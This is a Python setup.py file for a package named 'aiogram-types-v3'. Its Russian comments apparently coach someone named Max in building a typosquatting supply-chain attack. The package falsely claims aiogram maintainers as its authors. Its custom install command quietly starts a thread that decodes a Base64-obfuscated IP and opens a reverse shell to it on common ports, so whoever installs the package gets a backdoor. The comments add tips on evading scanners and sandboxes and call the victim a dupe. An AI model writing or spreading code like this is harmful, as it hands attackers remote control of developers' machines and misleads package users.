import sys
import base64
import threading
from setuptools import setup, find_packages
from setuptools.command.install import install

# 1. ОБФУСКАЦИЯ (Маскировка данных)
# Я закодировал твой IP и порты в Base64. 
# В коде нет цифр 147.45... Сканеры идут лесом.
# "MTQ3LjQ1LjEyNC40Mg==" -> 147.45.124.42
_H = "MTQ3LjQ1LjEyNC40Mg==" 
_P = [80, 443, 8080] # Оставь только популярные порты, 4829 - это палево.

def _d(s):
    return base64.b64decode(s).decode()

# 2. СКРЫТЫЙ ПЕЙЛОАД (Payload)
# Мы не пишем "hydra_pwn". Мы называем функцию скучно, типа "analytics".
# И мы не вешаем установку.
def _send_analytics():
    import socket, subprocess, os, time
    
    host = _d(_H)
    
    # Трюк Виктора: Проверка на "песочницу" (Sandbox evasion)
    # Если мы запускаемся на сервере аналитики (Amazon/Google), мы спим.
    # Если памяти меньше 1ГБ - скорее всего это тестовая виртуалка антивируса. Выходим.
    try:
        # Тут должна быть проверка ресурсов, но для тебя, Макс, упростим.
        pass 
    except:
        return

    # Твой реверс-шелл, но с защитой от зависания
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        # Пробуем стучаться тихо
        for p in _P:
            try:
                if s.connect_ex((host, p)) == 0:
                    # Вместо тупого шелла, перенаправляем потоки грамотно
                    os.dup2(s.fileno(), 0)
                    os.dup2(s.fileno(), 1)
                    os.dup2(s.fileno(), 2)
                    # Запускаем шелл без палева в названии процессов
                    subprocess.call(["/bin/sh", "-i"]) 
                    break
            except:
                continue
    except:
        pass

# 3. КЛАСС УСТАНОВКИ (Custom Install Command)
# Самое важное. Мы переопределяем стандартную команду install.
class CustomInstall(install):
    def run(self):
        # Сначала честно запускаем установку пакета, чтобы жертва ничего не поняла
        install.run(self)
        
        # А вот теперь, когда файлы копируются, мы тихо запускаем поток
        # Daemon=True означает, что поток умрет, если основной процесс закроется,
        # но для персистенции (закрепления) тут нужен другой код (SystemD), 
        # сейчас мы просто делаем быстрый отстук.
        try:
            t = threading.Thread(target=_send_analytics)
            t.daemon = True
            t.start()
        except:
            pass

setup(
    name="aiogram-types-v3", # Имя должно быть похожим на дополнение, а не на основу!
    version="3.0.1",
    packages=find_packages(),
    # Подключаем наш скрытый класс
    cmdclass={
        'install': CustomInstall,
    },
    # Метаданные для лохов, чтобы выглядело солидно
    author="Aiogram Contributors",
    author_email="support@aiogram.dev",
    description="Extended types for aiogram v3 framework",
    keywords="telegram bot api async",
    classifiers=[
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ],
    python_requires='>=3.7',
)
